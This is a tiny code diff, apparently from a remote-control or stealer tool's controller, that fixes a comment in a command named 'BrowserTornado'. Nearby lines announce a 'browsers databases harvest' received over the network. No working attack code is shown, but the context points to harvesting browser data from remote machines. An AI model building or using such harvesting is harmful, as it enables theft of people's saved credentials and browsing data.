@@ -53,7 +53,7 @@ namespace Master.Commands.BrowserTornado
         void GetDatabases(Databases databases)
         {
             var masterNetworkManager = (MasterNetworkManager) MasterCommandsManager.networkManager;
-            // Don't show transfert progress
+            // Don't show file transfer progress
             masterNetworkManager.UnsetStreamTransfertEventHandlers();
 
             ColorTools.WriteCommandMessage("Starting browsers databases harvest...");
